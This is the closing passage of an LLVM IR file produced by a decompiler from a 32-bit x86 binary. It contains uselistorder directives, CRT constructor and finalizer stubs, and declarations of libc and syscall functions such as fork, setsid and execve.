  uselistorder i32 8, { 116, 117, 118, 119, 120, 121, 123, 122, 124, 0, 1, 125, 126, 127, 128, 129, 130, 8, 131, 2, 17, 132, 133, 134, 135, 136, 137, 35, 138, 139, 38, 21, 22, 23, 24, 39, 25, 26, 40, 41, 27, 42, 28, 43, 44, 140, 141, 142, 143, 144, 145, 37, 36, 146, 147, 148, 149, 217, 218, 219, 32, 225, 33, 226, 34, 49, 29, 70, 110, 115, 71, 72, 171, 172, 173, 174, 175, 176, 177, 9, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 10, 188, 189, 190, 191, 192, 46, 11, 47, 12, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 45, 210, 211, 13, 212, 213, 214, 215, 14, 216, 169, 170, 3, 224, 150, 4, 5, 50, 151, 152, 153, 154, 156, 157, 158, 155, 159, 160, 161, 162, 30, 31, 163, 164, 165, 166, 167, 168, 220, 221, 222, 223, 6, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 48, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 19, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 20, 103, 104, 105, 106, 107, 108, 109, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 18, 111, 112, 113, 114, 7, 16, 15 }
  uselistorder i32 9, { 10, 11, 12, 13, 14, 4, 15, 16, 3, 8, 5, 17, 18, 19, 20, 6, 7, 1, 9, 0, 2 }
  uselistorder i32 (i32)* @__errno_location, { 51, 50, 49, 71, 70, 69, 48, 47, 46, 45, 44, 43, 27, 42, 1, 0, 20, 58, 26, 15, 14, 13, 12, 68, 11, 25, 24, 10, 23, 57, 56, 40, 39, 67, 66, 65, 22, 21, 55, 19, 35, 38, 37, 36, 2, 16, 54, 9, 8, 64, 34, 33, 63, 31, 7, 18, 3, 30, 17, 4, 53, 29, 28, 62, 41, 6, 5, 61, 60, 59, 72, 52, 32 }
  uselistorder i16 0, { 0, 8, 6, 9, 2, 1, 10, 7, 11, 13, 14, 15, 16, 12, 17, 18, 3, 4, 5 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8058a76, { 1, 0 }
  uselistorder label %dec_label_pc_8058a6c, { 1, 0 }
  uselistorder label %dec_label_pc_8058a2b, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_8058a8c = load i32, i32* @global_var_805e000.558, align 8192
  %v10_8058a91 = icmp eq i32 %v0_8058a8c, -1
  br i1 %v10_8058a91, label %dec_label_pc_8058aac, label %dec_label_pc_8058aa0.preheader

dec_label_pc_8058aa0.preheader:                   ; preds = %entry
  br label %dec_label_pc_8058aa0

dec_label_pc_8058aa0:                             ; preds = %dec_label_pc_8058aa0.preheader, %dec_label_pc_8058aa0
  %v4_8058aa3 = phi i32 [ %v0_8058a8c, %dec_label_pc_8058aa0.preheader ], [ %v2_8058aa5, %dec_label_pc_8058aa0 ]
  %v0_8058aa0 = phi i32 [ ptrtoint (i32* @global_var_805e000.558 to i32), %dec_label_pc_8058aa0.preheader ], [ %v1_8058aa0, %dec_label_pc_8058aa0 ]
  %v1_8058aa0 = add i32 %v0_8058aa0, -4
  call void @__pseudo_call(i32 %v4_8058aa3)
  %v1_8058aa5 = inttoptr i32 %v1_8058aa0 to i32*
  %v2_8058aa5 = load i32, i32* %v1_8058aa5, align 4
  %v10_8058aa7 = icmp eq i32 %v2_8058aa5, -1
  %v1_8058aaa = icmp eq i1 %v10_8058aa7, false
  br i1 %v1_8058aaa, label %dec_label_pc_8058aa0, label %dec_label_pc_8058aac.loopexit

dec_label_pc_8058aac.loopexit:                    ; preds = %dec_label_pc_8058aa0
  %v2_8058aac.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8058aac

dec_label_pc_8058aac:                             ; preds = %dec_label_pc_8058aac.loopexit, %entry
  %v2_8058aac = phi i32 [ %v2_8058aac.pre, %dec_label_pc_8058aac.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_8058aac

; uselistorder directives
  uselistorder i32 %v0_8058a8c, { 1, 0 }
  uselistorder i1 false, {}
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 39, 20, 33, 34, 35, 36, 44, 45, 46, 47, 4, 48, 1, 43, 49, 50, 51, 52, 53, 54, 5, 42, 40, 41, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 6, 2, 37, 7, 0, 38 }
  uselistorder i32 ptrtoint (i32* @global_var_805e000.558 to i32), { 0, 2, 3, 4, 1 }
  uselistorder i32 -1, { 0, 1, 187, 80, 70, 188, 203, 81, 204, 82, 205, 340, 83, 84, 206, 85, 2, 3, 183, 335, 207, 4, 5, 6, 88, 87, 86, 208, 144, 145, 65, 64, 63, 209, 210, 89, 211, 54, 341, 212, 342, 343, 213, 214, 344, 215, 66, 216, 217, 218, 90, 219, 345, 220, 221, 222, 91, 189, 346, 347, 92, 223, 224, 225, 348, 349, 8, 9, 350, 351, 170, 226, 171, 172, 162, 164, 165, 166, 167, 168, 169, 163, 55, 161, 152, 158, 227, 159, 160, 173, 174, 157, 175, 176, 177, 178, 179, 180, 181, 153, 156, 7, 229, 228, 78, 56, 230, 231, 352, 353, 10, 62, 74, 232, 354, 233, 154, 93, 94, 234, 95, 235, 190, 236, 237, 75, 238, 182, 239, 69, 240, 241, 242, 97, 96, 243, 244, 71, 245, 98, 99, 100, 246, 101, 102, 247, 103, 248, 104, 249, 105, 250, 106, 251, 107, 252, 108, 253, 109, 254, 110, 255, 11, 12, 13, 256, 79, 111, 112, 257, 258, 259, 260, 261, 262, 114, 113, 191, 115, 14, 116, 263, 117, 264, 67, 265, 118, 266, 267, 371, 268, 269, 15, 368, 369, 18, 17, 19, 20, 21, 119, 22, 120, 23, 270, 16, 370, 57, 271, 272, 273, 192, 274, 24, 25, 359, 362, 121, 363, 355, 364, 275, 276, 277, 360, 361, 278, 365, 366, 279, 367, 372, 122, 72, 280, 60, 356, 357, 61, 281, 282, 358, 283, 123, 284, 285, 286, 201, 202, 287, 288, 58, 155, 124, 289, 125, 290, 76, 77, 291, 126, 292, 127, 293, 128, 294, 129, 295, 130, 296, 131, 297, 132, 298, 133, 299, 134, 300, 135, 301, 136, 302, 137, 303, 138, 304, 139, 305, 140, 306, 141, 307, 142, 308, 143, 309, 26, 310, 311, 194, 312, 195, 313, 193, 336, 337, 27, 314, 28, 29, 30, 31, 32, 315, 33, 316, 34, 317, 35, 318, 36, 319, 37, 320, 38, 321, 39, 40, 42, 41, 43, 322, 44, 45, 73, 46, 47, 68, 59, 48, 49, 196, 339, 338, 323, 197, 324, 325, 326, 327, 50, 328, 185, 186, 184, 51, 146, 147, 148, 149, 150, 151, 52, 329, 330, 331, 332, 333, 334, 53, 198, 199, 200 }
  uselistorder i32 1, {}
  uselistorder label %dec_label_pc_8058aa0, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_8058ab7 = load i32, i32* @ebx, align 4
  %v1_8058ab8 = call i32 @__get_pc_thunk_bx(i32 %v0_8058ab7)
  store i32 %v1_8058ab8, i32* @eax, align 4
  %v0_8058ac3 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8058ac3

; uselistorder directives
  uselistorder i32* @eax, { 13, 105, 32, 107, 0, 3, 108, 109, 2, 110, 1, 31, 106, 111, 33, 112, 57, 58, 60, 14, 59, 113, 118, 114, 115, 116, 117, 4, 5, 119, 120, 121, 34, 122, 123, 124, 125, 126, 127, 128, 129, 130, 35, 131, 132, 133, 134, 135, 36, 37, 136, 137, 138, 139, 38, 140, 183, 141, 41, 39, 142, 40, 143, 144, 145, 146, 42, 43, 147, 148, 44, 149, 45, 150, 46, 47, 48, 151, 152, 153, 154, 49, 155, 156, 157, 158, 50, 171, 185, 53, 186, 187, 189, 54, 190, 6, 188, 10, 12, 184, 94, 15, 61, 62, 100, 63, 172, 174, 175, 173, 176, 177, 179, 180, 178, 168, 52, 7, 8, 159, 161, 160, 162, 163, 165, 56, 164, 166, 167, 16, 64, 65, 66, 17, 67, 18, 51, 68, 69, 70, 71, 19, 72, 20, 73, 21, 74, 22, 75, 23, 76, 24, 77, 25, 78, 26, 79, 80, 27, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 28, 91, 29, 92, 93, 30, 55, 95, 96, 97, 98, 99, 101, 102, 103, 104, 169, 170, 191, 181, 182, 9, 11 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 344, 1270, 1271, 1272, 948, 1273, 1274, 949, 1275, 23, 24, 25, 127, 82, 950, 1276, 1279, 1277, 1278, 951, 1280, 0, 1281, 1282, 1283, 345, 1284, 1285, 1286, 300, 1296, 1289, 1290, 1291, 28, 73, 1292, 1293, 1294, 952, 1295, 139, 140, 141, 1287, 1288, 147, 1297, 1298, 1300, 1301, 1299, 1302, 262, 1303, 1304, 1305, 1306, 1307, 1308, 149, 150, 953, 346, 347, 1067, 954, 1068, 148, 1069, 1070, 1071, 1072, 1073, 1074, 85, 86, 1075, 1076, 1077, 914, 1078, 84, 955, 83, 956, 151, 152, 957, 26, 958, 1079, 27, 959, 153, 348, 960, 961, 154, 962, 1311, 963, 1309, 247, 1310, 349, 350, 155, 156, 74, 964, 1312, 1313, 1314, 1315, 1316, 351, 965, 966, 157, 1317, 29, 87, 1186, 122, 123, 967, 1318, 88, 968, 30, 158, 1319, 89, 969, 1320, 970, 1322, 1321, 225, 971, 972, 1323, 1325, 1324, 226, 973, 1326, 974, 1327, 975, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 263, 1338, 159, 976, 977, 1339, 1340, 1341, 18, 264, 161, 160, 1342, 1343, 265, 1344, 1345, 978, 1346, 1347, 1348, 1349, 162, 1350, 979, 1351, 1352, 163, 980, 164, 352, 1357, 1353, 1354, 1355, 1356, 130, 31, 1358, 1359, 1360, 1361, 1362, 1363, 1369, 1370, 1371, 1372, 1364, 1365, 1366, 1367, 1368, 90, 91, 981, 1373, 1374, 165, 982, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 166, 1622, 1623, 167, 1624, 1625, 1626, 92, 131, 266, 142, 983, 132, 1393, 168, 1394, 32, 133, 124, 1395, 227, 169, 1396, 1, 1397, 984, 1398, 353, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 170, 985, 1406, 1407, 1408, 1409, 171, 1410, 986, 220, 354, 172, 987, 988, 989, 173, 1411, 267, 1412, 1413, 1414, 1415, 268, 332, 333, 1416, 1417, 1418, 1419, 1420, 1421, 990, 269, 1422, 125, 991, 1423, 174, 270, 271, 1424, 1425, 992, 1426, 1427, 1428, 1429, 118, 1697, 1698, 1699, 1700, 1701, 1702, 1703, 1704, 2, 228, 1430, 134, 1431, 229, 993, 994, 1432, 175, 1433, 1634, 1649, 1650, 1651, 355, 1652, 1215, 1653, 1706, 1080, 1707, 1708, 1709, 1081, 1710, 1654, 1655, 1711, 176, 1712, 1723, 1724, 33, 995, 3, 146, 996, 997, 1737, 1741, 230, 1742, 177, 893, 356, 357, 4, 1713, 1714, 1715, 178, 1035, 913, 179, 998, 1216, 5, 272, 273, 180, 1217, 1218, 181, 182, 1220, 1219, 1221, 1222, 358, 894, 1223, 1225, 1224, 1226, 1716, 1717, 183, 999, 1722, 1106, 1107, 1108, 1109, 1000, 1001, 1110, 1111, 1112, 274, 184, 185, 186, 359, 360, 126, 361, 1228, 1227, 362, 1235, 187, 188, 1002, 1082, 1003, 1083, 189, 1004, 190, 1005, 1237, 93, 1238, 1239, 1240, 1241, 1242, 6, 1006, 1257, 1007, 1084, 1085, 1086, 1087, 1008, 191, 1725, 895, 192, 275, 1729, 1732, 1731, 1658, 276, 1659, 1660, 1661, 1662, 277, 1663, 1664, 1665, 363, 1656, 364, 1657, 365, 1009, 1010, 366, 896, 1011, 367, 897, 193, 1012, 1666, 1667, 194, 195, 368, 898, 144, 76, 77, 1668, 1669, 1670, 1671, 1672, 1673, 196, 197, 369, 899, 143, 1674, 231, 1675, 128, 1676, 1677, 1679, 1013, 1678, 7, 1088, 8, 1730, 1229, 1230, 1231, 1232, 1234, 1233, 9, 278, 1635, 1636, 1637, 1596, 1014, 279, 1597, 1015, 1598, 1599, 1600, 1602, 1603, 1604, 1605, 1606, 1607, 1608, 1609, 1627, 1610, 198, 199, 1016, 1017, 280, 1738, 1740, 34, 200, 1434, 1435, 370, 1436, 201, 1018, 1437, 232, 135, 1618, 1619, 1438, 94, 1601, 281, 282, 202, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 203, 1019, 1454, 283, 1455, 1456, 1457, 1458, 1459, 35, 36, 1020, 248, 249, 1460, 1461, 1462, 1463, 204, 1464, 1465, 1466, 1021, 1467, 37, 38, 205, 1022, 1468, 1469, 1470, 1473, 1471, 1472, 39, 78, 95, 1474, 1475, 1476, 1477, 334, 1478, 1479, 206, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 208, 1488, 1489, 1490, 1023, 1491, 1492, 233, 234, 1493, 1494, 1495, 209, 207, 1496, 210, 1497, 1498, 1024, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 211, 1025, 1026, 212, 1518, 1519, 1520, 1027, 1028, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1029, 1030, 1529, 1530, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1031, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 1554, 1555, 1556, 284, 1032, 285, 1557, 1558, 1559, 1560, 1561, 1562, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 286, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 40, 96, 97, 98, 99, 1577, 1578, 1579, 1580, 1581, 1582, 213, 1583, 1033, 1584, 1585, 1586, 1587, 900, 1588, 1589, 1590, 1591, 1592, 1593, 214, 1034, 129, 75, 119, 1506, 235, 1594, 1595, 1718, 1719, 236, 1721, 1720, 100, 371, 1236, 1705, 215, 1243, 1726, 1727, 1728, 1089, 1613, 1633, 1090, 1640, 1733, 145, 287, 1695, 1739, 1641, 1696, 1736, 1642, 1265, 1643, 1644, 1091, 1100, 1734, 1735, 916, 221, 375, 222, 376, 1092, 374, 101, 21, 22, 377, 1093, 917, 385, 386, 291, 292, 290, 378, 387, 388, 41, 216, 288, 372, 918, 1094, 217, 289, 373, 915, 1095, 379, 1096, 380, 293, 1097, 381, 382, 383, 389, 390, 1098, 1099, 384, 392, 393, 391, 250, 251, 252, 103, 1102, 394, 1101, 397, 398, 102, 395, 399, 400, 396, 1103, 401, 1104, 335, 1105, 402, 136, 427, 920, 432, 433, 294, 42, 43, 1113, 919, 921, 434, 435, 424, 1114, 1116, 425, 426, 1115, 244, 1117, 336, 1118, 1119, 1120, 1121, 922, 436, 437, 421, 1122, 1124, 422, 423, 1123, 243, 1125, 923, 438, 439, 418, 1126, 1128, 419, 420, 1127, 242, 1129, 924, 440, 441, 415, 1130, 1132, 416, 417, 1131, 241, 1133, 925, 442, 443, 412, 1134, 1136, 413, 414, 1135, 240, 1137, 926, 444, 445, 409, 1138, 1140, 410, 411, 1139, 239, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 927, 446, 447, 406, 1148, 1150, 407, 408, 1149, 238, 1151, 928, 448, 449, 403, 1152, 1154, 404, 405, 1153, 237, 1155, 929, 450, 451, 428, 930, 931, 452, 453, 429, 218, 1156, 1157, 932, 454, 455, 1158, 1159, 933, 456, 457, 934, 458, 459, 430, 1160, 935, 460, 461, 431, 1161, 936, 462, 463, 937, 464, 465, 938, 506, 507, 104, 1172, 45, 1162, 1163, 1164, 901, 302, 1165, 1166, 1167, 1168, 902, 301, 1169, 1170, 1171, 44, 1173, 1174, 1175, 19, 105, 1182, 47, 1176, 1177, 1178, 903, 303, 1179, 1180, 1181, 46, 1183, 1184, 1185, 20, 1187, 304, 1188, 48, 305, 1189, 223, 1190, 939, 467, 468, 940, 469, 470, 941, 471, 472, 942, 473, 474, 943, 475, 476, 224, 944, 477, 478, 1191, 337, 1192, 1193, 1194, 1195, 466, 1196, 904, 1197, 1198, 479, 137, 1199, 1200, 49, 308, 1201, 338, 1202, 1203, 1204, 1205, 1206, 480, 1207, 306, 50, 307, 1208, 1209, 1210, 1211, 253, 483, 481, 482, 905, 906, 484, 51, 1212, 1213, 52, 79, 254, 255, 256, 1214, 485, 295, 309, 486, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 907, 1059, 1060, 908, 313, 1061, 1062, 310, 311, 312, 1063, 1064, 909, 488, 1065, 1244, 1245, 108, 10, 487, 1246, 106, 107, 489, 910, 17, 53, 54, 1247, 55, 80, 1248, 314, 339, 490, 491, 492, 315, 911, 1249, 493, 1250, 1251, 1252, 296, 1253, 113, 1254, 1255, 1256, 56, 109, 110, 111, 112, 912, 1258, 57, 58, 59, 60, 61, 11, 12, 13, 14, 1259, 1261, 1262, 1263, 496, 1264, 494, 316, 495, 317, 1260, 340, 497, 498, 297, 318, 298, 15, 299, 945, 499, 1266, 257, 258, 259, 260, 501, 1267, 500, 502, 319, 1268, 1269, 503, 261, 1611, 504, 505, 1612, 1614, 1615, 1616, 946, 322, 321, 320, 325, 323, 324, 114, 62, 81, 63, 1617, 508, 64, 115, 509, 510, 1621, 511, 1620, 513, 514, 116, 512, 515, 516, 1628, 1629, 341, 1630, 1631, 138, 1632, 65, 342, 117, 947, 1638, 517, 518, 519, 1639, 521, 520, 1645, 1646, 1647, 1648, 522, 66, 523, 524, 525, 526, 527, 1689, 121, 120, 67, 328, 329, 1680, 1681, 1682, 1683, 245, 326, 327, 330, 1684, 1685, 1686, 1687, 68, 69, 70, 1688, 343, 71, 72, 1690, 1691, 331, 16, 1692, 1693, 1694, 219, 1066, 246, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 1743, 1744, 1745, 1746, 1747, 1748, 1749, 1750 }
  uselistorder i32* @ebx, { 75, 437, 1, 438, 439, 440, 2, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 3, 456, 4, 457, 458, 459, 460, 461, 463, 466, 467, 468, 469, 470, 464, 462, 465, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 492, 5, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 505, 503, 504, 506, 507, 139, 140, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 6, 538, 7, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 711, 712, 9, 564, 555, 553, 554, 556, 559, 557, 558, 560, 561, 562, 8, 563, 565, 566, 567, 568, 569, 570, 571, 10, 572, 11, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 587, 588, 589, 590, 12, 591, 592, 593, 13, 594, 14, 595, 596, 597, 598, 599, 774, 775, 15, 776, 777, 780, 781, 600, 699, 700, 701, 713, 16, 714, 715, 167, 716, 717, 782, 783, 784, 785, 786, 88, 787, 718, 719, 720, 721, 722, 788, 789, 790, 31, 32, 803, 804, 805, 822, 823, 824, 827, 28, 17, 26, 806, 816, 820, 821, 791, 168, 169, 170, 171, 172, 173, 174, 175, 792, 793, 794, 795, 802, 121, 122, 176, 177, 178, 179, 180, 181, 182, 186, 89, 90, 91, 92, 93, 191, 192, 18, 0, 193, 213, 214, 95, 194, 195, 196, 94, 96, 215, 216, 217, 812, 813, 97, 98, 99, 100, 723, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 19, 738, 739, 724, 725, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 29, 751, 752, 753, 754, 755, 20, 756, 757, 758, 759, 760, 761, 762, 763, 764, 810, 811, 183, 184, 185, 670, 671, 672, 673, 674, 675, 21, 676, 677, 678, 679, 680, 681, 682, 683, 684, 828, 829, 830, 831, 832, 833, 834, 838, 839, 203, 204, 601, 602, 691, 692, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 644, 645, 22, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 23, 659, 660, 661, 662, 663, 664, 71, 72, 73, 74, 639, 641, 640, 642, 643, 665, 666, 667, 668, 669, 796, 24, 797, 798, 799, 800, 30, 25, 27, 801, 840, 841, 842, 843, 844, 187, 188, 189, 778, 779, 197, 198, 808, 809, 101, 102, 685, 686, 697, 698, 103, 104, 105, 702, 703, 814, 815, 769, 770, 771, 835, 836, 837, 704, 705, 772, 773, 825, 826, 432, 433, 706, 707, 708, 709, 710, 106, 107, 108, 118, 119, 120, 807, 817, 818, 819, 109, 110, 111, 112, 113, 114, 115, 116, 117, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 190, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 199, 200, 201, 202, 205, 206, 207, 208, 209, 210, 211, 212, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 434, 435, 436, 687, 688, 689, 690, 693, 694, 695, 696, 765, 766, 767, 768 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_7() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_8() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
